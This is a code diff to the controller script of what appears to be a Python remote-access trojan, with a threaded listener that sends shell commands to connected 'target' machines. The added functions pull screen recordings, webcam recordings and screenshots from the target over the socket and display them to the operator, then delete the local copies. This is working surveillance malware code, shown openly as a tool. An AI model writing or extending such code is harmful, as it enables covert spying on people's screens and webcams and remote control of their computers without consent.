@@ -12,7 +12,11 @@ import sys  # module help us to operate on command line and execute terminal com
 import threading # module to support multi-threading
 import time # module to access computer date/time
 from queue import Queue # queue data structure is required
-#import base64
+import subprocess
+import cv2
+import os
+import pyautogui
+
 
 NUMBER_OF_THREADS=2 # constant storing number of threads required in our program
 JOB_NUMBER=[1,2]  # Job number 1-> thread 1 -> listening for new connections
@@ -165,11 +169,32 @@ def get_target(cmd):
 		return None
 
 
-# to get screen recording of target
+# to display recording
+def show_video(filepath):
+	vid=cv2.VideoCapture(filepath)
+	SCREEN_SIZE=pyautogui.size()
+	window_name=""
+	if filepath == 'screen.avi':
+		window_name="LiveScreen"
+	elif filepath == "webcam2.avi":
+		window_name="WebcamFeed"
+	cv2.namedWindow(window_name,cv2.WINDOW_NORMAL)
+	cv2.resizeWindow(window_name,SCREEN_SIZE[0],SCREEN_SIZE[1])
+	while vid.isOpened():
+		ret,frame=vid.read()
+		if ret == True:
+			cv2.imshow(window_name,frame)
+			cv2.waitKey(25)
+		else:
+			break
+
+	vid.release()
+	cv2.destroyAllWindows()
+
+# to get screen recording of target machine - rec command
 def screenCapture(conn):
 	print("capturing..")
 	l=int(conn.recv(20480).decode())
-	print(l)
 	conn.send("start".encode())
 	f=open("screen.avi","wb")
 	curr_len=0
@@ -184,7 +209,68 @@ def screenCapture(conn):
 	f.close()
 	print("\ndone..")
 	conn.send("done".encode())
+	show_video('screen.avi')
+	os.remove('screen.avi')
 	output=conn.recv(10240).decode()
+	print(output,end="")
+
+# to capture webcam feed of target
+def webcamCapture(conn):
+	print("capturing..")
+	l=int(conn.recv(20480).decode())
+	print(l)
+	conn.send("start".encode())
+	f=open("webcam2.avi","wb")
+	curr_len=0
+	while curr_len<l:
+		print("",end="\r")
+		data=conn.recv(204800000)
+		curr_len+=len(data)
+		print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
+		f.write(data)
+
+
+	f.close()
+	print("\ndone..")
+	conn.send("done".encode())
+	show_video('webcam2.avi')
+	os.remove('webcam2.avi')
+	output=conn.recv(10240).decode()
+	print(output,end="")
+
+
+# to display screenshot of target machine
+def show_image():
+	im=cv2.imread('ss.jpg')
+	SCREEN_SIZE=pyautogui.size()
+	cv2.namedWindow("Screenshot",cv2.WINDOW_NORMAL)
+	cv2.resizeWindow("Screenshot",SCREEN_SIZE[0],SCREEN_SIZE[1])
+	cv2.imshow("Screenshot",im)
+	cv2.waitKey(0)
+	cv2.destroyAllWindows()
+
+
+# to get screenshot of target machine - ss command
+def screenshot(conn):
+	print("clicking")
+	l=int(conn.recv(20480).decode())
+	conn.send("start".encode())
+	curr_len=0
+	f=open("ss.jpg","wb")
+
+	while curr_len<l:
+		print("",end="\r")
+		data=conn.recv(2048000)
+		f.write(data)
+		curr_len+=len(data)
+		print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
+
+	f.close()
+	print("\ndone")
+	conn.send("done".encode())
+	show_image()
+	os.remove("ss.jpg")
+	output=conn.recv(20480).decode()
 	print(output,end="")
 
 
@@ -197,8 +283,6 @@ def send_target_commands(conn):
 
 			if cmd=="quit": # if input command is quit , then we close the connection,socket and terminal
 				break
-
-
 
 
 			if len(str.encode(cmd)) > 0: # str.encode() it converts string from unicode format to utf-8 format(byte format)
@@ -216,8 +300,13 @@ def send_target_commands(conn):
 				screenCapture(conn)
 				continue
 
+			if client_response == "clicking":
+				screenshot(conn)
+				continue
 
-
+			if client_response == "capturing_webcam" :
+				webcamCapture(conn)
+				continue
 
 			print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal
 		except Exception as e:
